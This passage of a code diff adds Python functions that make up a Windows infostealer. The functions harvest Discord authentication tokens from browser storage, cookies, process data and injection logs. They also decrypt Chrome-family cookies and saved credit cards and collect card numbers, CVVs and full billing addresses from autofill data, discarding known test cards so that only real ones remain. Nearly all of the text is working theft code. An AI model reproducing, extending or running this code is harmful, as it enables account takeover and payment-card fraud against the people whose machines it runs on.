+            r'authorization["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',  # Authorization header
+        ]
+        
+        for path, browser_name in browser_paths:
+            if not os.path.exists(path):
+                continue
+            
+            try:
+                if browser_name == 'Firefox':
+                    # Special handling for Firefox profiles
+                    for profile_dir in os.listdir(path):
+                        profile_path = os.path.join(path, profile_dir)
+                        if os.path.isdir(profile_path):
+                            sessionstore_path = os.path.join(profile_path, 'sessionstore-backups')
+                            if os.path.exists(sessionstore_path):
+                                for file_name in os.listdir(sessionstore_path):
+                                    if file_name.endswith('.jsonlz4') or file_name.endswith('.json'):
+                                        file_path = os.path.join(sessionstore_path, file_name)
+                                        try:
+                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                                content = f.read()
+                                                if any(domain in content for domain in discord_domains):
+                                                    for pattern in token_patterns:
+                                                        matches = re.findall(pattern, content)
+                                                        for match in matches:
+                                                            if validate_discord_token_enhanced(match):
+                                                                tokens.append((match, f'{browser_name} - {profile_dir}'))
+                                        except:
+                                            continue
+                else:
+                    # Handle Chromium-based browsers
+                    for file_name in os.listdir(path):
+                        if file_name.endswith(('.ldb', '.log')):
+                            file_path = os.path.join(path, file_name)
+                            try:
+                                with open(file_path, 'rb') as f:
+                                    content = f.read().decode('utf-8', errors='ignore')
+                                    
+                                # Look for Discord-related content
+                                if any(domain in content for domain in discord_domains):
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        for match in matches:
+                                            if validate_discord_token_enhanced(match):
+                                                tokens.append((match, browser_name))
+                            except:
+                                continue
+                                
+            except Exception as browser_error:
+                print(f"Debug: Error scanning {browser_name}: {str(browser_error)}")
+                continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Browser token extraction error: {str(e)}")
+        return []
+
+def extract_discord_tokens_from_memory():
+    """Extract Discord tokens from running process memory (advanced method)"""
+    try:
+        tokens = []
+        
+        # Find Discord processes
+        discord_processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+            try:
+                if 'discord' in proc.info['name'].lower():
+                    discord_processes.append(proc)
+            except:
+                continue
+        
+        if not discord_processes:
+            return tokens
+        
+        # This is a simplified memory scanning approach
+        # In a real implementation, you would use more advanced memory reading techniques
+        for proc in discord_processes:
+            try:
+                # Get process memory info
+                memory_info = proc.memory_info()
+                
+                # Look for token patterns in process command line and environment
+                try:
+                    cmdline = proc.cmdline()
+                    environ = proc.environ() if hasattr(proc, 'environ') else {}
+                    
+                    # Combine command line and environment for scanning
+                    search_text = ' '.join(cmdline) + ' ' + ' '.join(f"{k}={v}" for k, v in environ.items())
+                    
+                    token_patterns = [
+                        r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                    ]
+                    
+                    for pattern in token_patterns:
+                        matches = re.findall(pattern, search_text)
+                        for match in matches:
+                            if validate_discord_token_enhanced(match):
+                                tokens.append((match, f'Memory - PID {proc.pid}'))
+                                
+                except (psutil.AccessDenied, psutil.NoSuchProcess):
+                    continue
+                    
+            except Exception as proc_error:
+                continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Memory token extraction error: {str(e)}")
+        return []
+
+def extract_discord_injection_tokens():
+    """Extract tokens from Discord injection data"""
+    try:
+        tokens = []
+        
+        # Look for Discord injection log files
+        injection_paths = [
+            os.path.expanduser("~/AppData/Roaming/Discord"),
+            os.path.expanduser("~/AppData/Local/Discord"),
+            os.path.expanduser("~/AppData/Local/DiscordCanary"),
+            os.path.expanduser("~/AppData/Local/DiscordPTB"),
+            "C:\\Users\\Public\\Libraries\\Discord",
+            "C:\\Windows\\Temp"
+        ]
+        
+        injection_files = [
+            "injection_log.txt", "credentials.log", "tokens.txt", "discord_data.txt",
+            "userdata.json", "sessions.dat", "passwords.log"
+        ]
+        
+        token_patterns = [
+            r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+            r'token["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',
+            r'authorization["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',
+        ]
+        
+        for injection_path in injection_paths:
+            if not os.path.exists(injection_path):
+                continue
+                
+            for root, dirs, files in os.walk(injection_path):
+                for file in files:
+                    if any(inj_file in file.lower() for inj_file in injection_files):
+                        try:
+                            file_path = os.path.join(root, file)
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                
+                            for pattern in token_patterns:
+                                matches = re.findall(pattern, content)
+                                for match in matches:
+                                    token = match if isinstance(match, str) else match
+                                    if validate_discord_token_enhanced(token):
+                                        tokens.append((token, f'Injection - {file}'))
+                                        
+                        except Exception:
+                            continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Injection token extraction error: {str(e)}")
+        return []
+
+def extract_discord_tokens_from_cookies():
+    """Extract Discord tokens from browser cookies (web sessions)"""
+    try:
+        tokens = []
+        
+        # Browser cookie databases
+        cookie_paths = [
+            # Chrome
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'), 'Chrome'),
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Network', 'Cookies'), 'Chrome Profile 1'),
+            
+            # Edge
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'), 'Edge'),
+            
+            # Opera
+            (os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Network', 'Cookies'), 'Opera'),
+            
+            # Brave
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'), 'Brave'),
+        ]
+        
+        discord_domains = ['discord.com', 'discordapp.com', '.discord.com', '.discordapp.com']
+        
+        for cookie_db_path, browser_name in cookie_paths:
+            if not os.path.exists(cookie_db_path):
+                continue
+                
+            try:
+                # Create temporary copy to avoid locking issues
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(cookie_db_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Query Discord-related cookies
+                for domain in discord_domains:
+                    try:
+                        cursor.execute("""
+                            SELECT name, value, host_key, path, encrypted_value 
+                            FROM cookies 
+                            WHERE host_key LIKE ? AND (name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%')
+                        """, (f'%{domain}%',))
+                        
+                        for row in cursor.fetchall():
+                            name, value, host_key, path, encrypted_value = row
+                            
+                            # Try to decrypt the cookie value if encrypted
+                            if encrypted_value:
+                                try:
+                                    # Get master key for this browser
+                                    browser_profile_path = os.path.dirname(os.path.dirname(cookie_db_path))
+                                    master_key = get_master_key(os.path.join(browser_profile_path, 'Local State'))
+                                    if master_key:
+                                        decrypted_value = decrypt_token(encrypted_value, master_key)
+                                        if decrypted_value:
+                                            value = decrypted_value
+                                except:
+                                    pass
+                            
+                            # Check if the cookie value looks like a Discord token
+                            if value and len(value) > 50:
+                                # Look for token patterns in the cookie value
+                                token_patterns = [
+                                    r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                                ]
+                                
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, value)
+                                    for match in matches:
+                                        if validate_discord_token_enhanced(match):
+                                            tokens.append((match, f'{browser_name} Cookie - {name}'))
+                                            
+                    except Exception as domain_error:
+                        print(f"Debug: Error querying {domain} in {browser_name}: {str(domain_error)}")
+                        continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"Debug: Error processing {browser_name} cookies: {str(browser_error)}")
+                continue
+        
+        # Also check Firefox cookies
+        try:
+            firefox_profiles = get_firefox_profiles()
+            for profile_path in firefox_profiles:
+                cookie_file = os.path.join(profile_path, 'cookies.sqlite')
+                if os.path.exists(cookie_file):
+                    try:
+                        temp_db = tempfile.mktemp(suffix='.db')
+                        shutil.copy2(cookie_file, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        for domain in discord_domains:
+                            try:
+                                cursor.execute("""
+                                    SELECT name, value, host 
+                                    FROM moz_cookies 
+                                    WHERE host LIKE ? AND (name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%')
+                                """, (f'%{domain}%',))
+                                
+                                for row in cursor.fetchall():
+                                    name, value, host = row
+                                    
+                                    if value and len(value) > 50:
+                                        token_patterns = [
+                                            r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                                        ]
+                                        
+                                        for pattern in token_patterns:
+                                            matches = re.findall(pattern, value)
+                                            for match in matches:
+                                                if validate_discord_token_enhanced(match):
+                                                    tokens.append((match, f'Firefox Cookie - {name}'))
+                                                    
+                            except Exception:
+                                continue
+                        
+                        conn.close()
+                        os.unlink(temp_db)
+                        
+                    except Exception:
+                        continue
+        except Exception as e:
+            print(f"Debug: Firefox cookie extraction error: {str(e)}")
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Cookie token extraction error: {str(e)}")
+        return []
+
+def extract_autofill_credit_cards_enhanced():
+    """Enhanced credit card extraction from browser autofill with more browsers and profiles"""
+    try:
+        cards = []
+        
+        # Comprehensive browser list with all profiles
+        browser_configs = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            ('Chrome Canary', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Edge Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default', 'Web Data')),
+            ('Edge Dev', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default', 'Web Data')),
+            
+            # Other browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Opera GX', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+            ('Yandex', os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, db_path in browser_configs:
+            if os.path.exists(db_path):
+                cards.extend(extract_chrome_autofill_cards_enhanced(db_path, browser_name))
+        
+        # Firefox profiles
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_autofill_cards_enhanced(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced autofill extraction error: {e}")
+        return []
+
+def extract_chrome_autofill_cards_enhanced(db_path, browser_name):
+    """Enhanced Chrome autofill extraction with better decryption and more data"""
+    try:
+        cards = []
+        
+        # Create a temporary copy to avoid locking issues
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query to get more card data
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, 
+                   date_modified, use_count, use_date, billing_address_id, origin
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, month, year, encrypted_card, date_modified, use_count, use_date, billing_id, origin = row
+                
+                # Enhanced decryption with multiple methods
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
+                    # Get additional billing address info if available
+                    billing_info = None
+                    if billing_id:
+                        try:
+                            cursor.execute("""
+                                SELECT first_name, last_name, street_address, city, state, zipcode, country_code
+                                FROM autofill_profiles
+                                WHERE guid = ?
+                            """, (billing_id,))
+                            billing_row = cursor.fetchone()
+                            if billing_row:
+                                billing_info = {
+                                    'first_name': billing_row[0],
+                                    'last_name': billing_row[1],
+                                    'address': billing_row[2],
+                                    'city': billing_row[3],
+                                    'state': billing_row[4],
+                                    'zipcode': billing_row[5],
+                                    'country': billing_row[6]
+                                }
+                        except:
+                            pass
+                    
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'date_modified': date_modified,
+                        'use_count': use_count,
+                        'use_date': use_date,
+                        'origin': origin,
+                        'billing_info': billing_info,
+                        'source': f'{browser_name}_autofill',
+                        'browser': browser_name
+                    })
+            except Exception as card_error:
+                print(f"💳 Error processing card in {browser_name}: {str(card_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced {browser_name} autofill extraction error: {e}")
+        return []
+
+def decrypt_chrome_credit_card_enhanced(encrypted_data, chrome_profile_path=None):
+    """Enhanced Chrome credit card decryption with multiple fallback methods"""
+    try:
+        # Method 1: Standard DPAPI decryption (older Chrome versions)
+        try:
+            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
+            return decrypted.decode('utf-8')
+        except Exception as dpapi_error:
+            print(f"💳 DPAPI decryption failed: {str(dpapi_error)}")
+        
+        # Method 2: AES-GCM decryption (newer Chrome versions)
+        try:
+            # Get Chrome encryption key from Local State
+            if chrome_profile_path:
+                local_state_path = os.path.join(chrome_profile_path, 'Local State')
+            else:
+                # Default Chrome paths
+                chrome_paths = [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data')
+                ]
+                local_state_path = None
+                for chrome_path in chrome_paths:
+                    test_path = os.path.join(chrome_path, 'Local State')
+                    if os.path.exists(test_path):
+                        local_state_path = test_path
+                        break
+            
+            if not local_state_path or not os.path.exists(local_state_path):
+                return None
+            
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            
+            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
+                return None
+            
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
+            # Try AES-GCM decryption with proper tag handling
+            if len(encrypted_data) > 31:  # v10 format
+                nonce = encrypted_data[3:15]
+                ciphertext = encrypted_data[15:-16]
+                tag = encrypted_data[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+            
+        except Exception as aes_error:
+            print(f"💳 AES-GCM decryption failed: {str(aes_error)}")
+        
+        # Method 3: Try different encryption formats
+        try:
+            # Some versions use different header formats
+            if len(encrypted_data) > 15:
+                # Try v11 format
+                nonce = encrypted_data[0:12]
+                ciphertext = encrypted_data[12:-16]
+                tag = encrypted_data[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+                
+        except Exception as alt_error:
+            print(f"💳 Alternative decryption failed: {str(alt_error)}")
+        
+        return None
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome decryption error: {e}")
+        return None
+
+def validate_credit_card_enhanced(card_number):
+    """Enhanced credit card validation with better Luhn algorithm and issuer detection"""
+    try:
+        if not card_number:
+            return False
+            
+        # Remove any non-digit characters
+        card_number = re.sub(r'\D', '', str(card_number))
+        
+        # Check if it's 13-19 digits (valid card length range)
+        if len(card_number) < 13 or len(card_number) > 19:
+            return False
+        
+        # Enhanced Luhn algorithm validation
+        def luhn_checksum(card_num):
+            def digits_of(n):
+                return [int(d) for d in str(n)]
+            digits = digits_of(card_num)
+            odd_digits = digits[-1::-2]
+            even_digits = digits[-2::-2]
+            checksum = sum(odd_digits)
+            for d in even_digits:
+                doubled = d * 2
+                if doubled > 9:
+                    doubled = doubled - 9
+                checksum += doubled
+            return checksum % 10
+        
+        if luhn_checksum(card_number) != 0:
+            return False
+        
+        # Additional validation: Check for known test/fake card patterns
+        test_patterns = [
+            r'^4000000000000000',  # Test Visa
+            r'^4111111111111111',  # Test Visa
+            r'^5555555555554444',  # Test Mastercard
+            r'^2223000048400011',  # Test Mastercard
+            r'^378282246310005',   # Test Amex
+            r'^371449635398431',   # Test Amex
+            r'^6011111111111117',  # Test Discover
+            r'^1234567890123456',  # Obviously fake
+            r'^0000000000000000',  # All zeros
+            r'^9999999999999999',  # All nines
+        ]
+        
+        for pattern in test_patterns:
+            if re.match(pattern, card_number):
+                return False  # Reject test/fake cards
+        
+        # Check for repeated digits (likely fake)
+        if len(set(card_number)) <= 2:  # Only 1-2 unique digits
+            return False
+        
+        # Issuer validation (basic check for major card types)
+        issuer_patterns = {
+            'visa': r'^4[0-9]{12}(?:[0-9]{3})?$',
+            'mastercard': r'^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$',
+            'amex': r'^3[47][0-9]{13}$',
+            'discover': r'^6(?:011|5[0-9]{2})[0-9]{12}$',
+            'diners': r'^3[0689][0-9]{11}$',
+            'jcb': r'^(?:2131|1800|35[0-9]{3})[0-9]{11}$'
+        }
+        
+        # Check if card matches any known issuer pattern
+        valid_issuer = False
+        for issuer, pattern in issuer_patterns.items():
+            if re.match(pattern, card_number):
+                valid_issuer = True
+                break
+        
+        return valid_issuer
+        
+    except Exception as e:
+        print(f"💳 Enhanced card validation error: {e}")
+        return False
+
+def extract_saved_payment_methods_enhanced():
+    """Enhanced extraction of saved payment methods with more browsers and better decryption"""
+    try:
+        cards = []
+        
+        # Enhanced browser paths including all variants and profiles
+        browser_paths = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            ('Chrome Canary', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Beta', 'User Data', 'Default', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Edge Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default', 'Web Data')),
+            ('Edge Dev', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default', 'Web Data')),
+            
+            # Other Chromium browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Opera GX', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+            ('Yandex', os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Web Data')),
+            ('Thorium', os.path.join(os.getenv('LOCALAPPDATA'), 'Thorium', 'User Data', 'Default', 'Web Data')),
+            ('Ungoogled Chromium', os.path.join(os.getenv('LOCALAPPDATA'), 'Chromium', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, web_data_path in browser_paths:
+            if os.path.exists(web_data_path):
+                cards.extend(extract_chrome_payment_methods_enhanced(web_data_path, browser_name))
+        
+        # Enhanced Firefox saved payment methods
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_payment_methods_enhanced(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced saved payment methods extraction error: {e}")
+        return []
+
+def extract_chrome_payment_methods_enhanced(db_path, browser_name):
+    """Enhanced Chrome payment methods extraction with comprehensive data collection"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query to get all available payment data
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, 
+                   billing_address_id, date_modified, use_count, use_date, origin,
+                   nickname, card_type, issuer_id
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                (name, month, year, encrypted_card, billing_id, date_modified, 
+                 use_count, use_date, origin, nickname, card_type, issuer_id) = row
+                
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
+                    # Get comprehensive billing address info
+                    billing_info = None
+                    if billing_id:
+                        try:
+                            cursor.execute("""
+                                SELECT first_name, last_name, middle_name, full_name,
+                                       company_name, street_address, dependent_locality,
+                                       city, state, zipcode, sorting_code, country_code,
+                                       phone_number, email, language_code
+                                FROM autofill_profiles
+                                WHERE guid = ?
+                            """, (billing_id,))
+                            billing_row = cursor.fetchone()
+                            if billing_row:
+                                billing_info = {
+                                    'first_name': billing_row[0],
+                                    'last_name': billing_row[1],
+                                    'middle_name': billing_row[2],
+                                    'full_name': billing_row[3],
+                                    'company': billing_row[4],
+                                    'address': billing_row[5],
+                                    'address2': billing_row[6],
+                                    'city': billing_row[7],
+                                    'state': billing_row[8],
+                                    'zipcode': billing_row[9],
+                                    'sorting_code': billing_row[10],
+                                    'country': billing_row[11],
+                                    'phone': billing_row[12],
+                                    'email': billing_row[13],
+                                    'language': billing_row[14]
+                                }
+                        except Exception as billing_error:
+                            print(f"💳 Billing info extraction error: {str(billing_error)}")
+                    
+                    # Determine card issuer from number
+                    card_issuer = determine_card_issuer(decrypted_card)
+                    
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'nickname': nickname,
+                        'card_type': card_type,
+                        'issuer': card_issuer,
+                        'issuer_id': issuer_id,
+                        'billing_info': billing_info,
+                        'date_modified': date_modified,
+                        'use_count': use_count,
+                        'use_date': use_date,
+                        'origin': origin,
+                        'source': f'{browser_name}_saved',
+                        'browser': browser_name
+                    })
+            except Exception as card_error:
+                print(f"💳 Error processing saved card: {str(card_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome payment methods extraction error: {e}")
+        return []
+
+def determine_card_issuer(card_number):
+    """Determine credit card issuer from card number"""
+    try:
+        card_number = re.sub(r'\D', '', str(card_number))
+        
+        if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', card_number):
+            return 'Visa'
+        elif re.match(r'^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$', card_number):
+            return 'Mastercard'
+        elif re.match(r'^3[47][0-9]{13}$', card_number):
+            return 'American Express'
+        elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', card_number):
+            return 'Discover'
+        elif re.match(r'^3[0689][0-9]{11}$', card_number):
+            return 'Diners Club'
+        elif re.match(r'^(?:2131|1800|35[0-9]{3})[0-9]{11}$', card_number):
+            return 'JCB'
+        else:
+            return 'Unknown'
+            
+    except:
+        return 'Unknown'
+
+def extract_form_credit_cards_enhanced():
+    """Enhanced form data extraction with comprehensive browser coverage"""
+    try:
+        cards = []
+        
+        # Enhanced browser form data paths
+        form_data_paths = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            
+            # Other browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, db_path in form_data_paths:
+            if os.path.exists(db_path):
+                cards.extend(extract_chrome_form_data_enhanced(db_path, browser_name))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced form data extraction error: {e}")
+        return []
+
+def extract_chrome_form_data_enhanced(db_path, browser_name):
+    """Enhanced Chrome form data extraction with better pattern matching"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query for credit card form data with more comprehensive field matching
+        cursor.execute("""
+            SELECT name, value, date_created, date_last_used, count, origin
+            FROM autofill
+            WHERE (name LIKE '%card%' OR name LIKE '%credit%' OR name LIKE '%payment%' 
+                   OR name LIKE '%cc%' OR name LIKE '%cvv%' OR name LIKE '%cvc%'
+                   OR name LIKE '%exp%' OR name LIKE '%number%' OR name LIKE '%pan%'
+                   OR name LIKE '%billing%' OR name LIKE '%cardholder%')
+            AND value IS NOT NULL AND value != ''
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, value, date_created, date_last_used, count, origin = row
+                
+                # Enhanced credit card pattern detection
+                if validate_credit_card_enhanced(value):
+                    # Get additional context from the same form
+                    form_context = get_form_context(cursor, origin, date_created)
+                    
+                    cards.append({
+                        'card_number': value,
+                        'field_name': name,
+                        'date_created': date_created,
+                        'date_last_used': date_last_used,
+                        'use_count': count,
+                        'origin': origin,
+                        'form_context': form_context,
+                        'source': f'{browser_name}_form',
+                        'browser': browser_name
+                    })
+                elif 'cvv' in name.lower() or 'cvc' in name.lower():
+                    # Save CVV codes separately
+                    if value and len(value) in [3, 4] and value.isdigit():
+                        cards.append({
+                            'cvv': value,
+                            'field_name': name,
+                            'date_created': date_created,
+                            'origin': origin,
+                            'source': f'{browser_name}_cvv',
+                            'browser': browser_name
+                        })
+            except Exception as row_error:
+                print(f"💳 Error processing form row: {str(row_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome form data extraction error: {e}")
+        return []
+
+def get_form_context(cursor, origin, date_created):
+    """Get additional form context (names, addresses, etc.) from the same form submission"""
+    try:
+        context = {}
+        
+        # Look for related form fields from the same origin and time
+        cursor.execute("""
+            SELECT name, value
+            FROM autofill
+            WHERE origin = ? AND ABS(date_created - ?) < 3600
+            AND (name LIKE '%name%' OR name LIKE '%address%' OR name LIKE '%email%' 
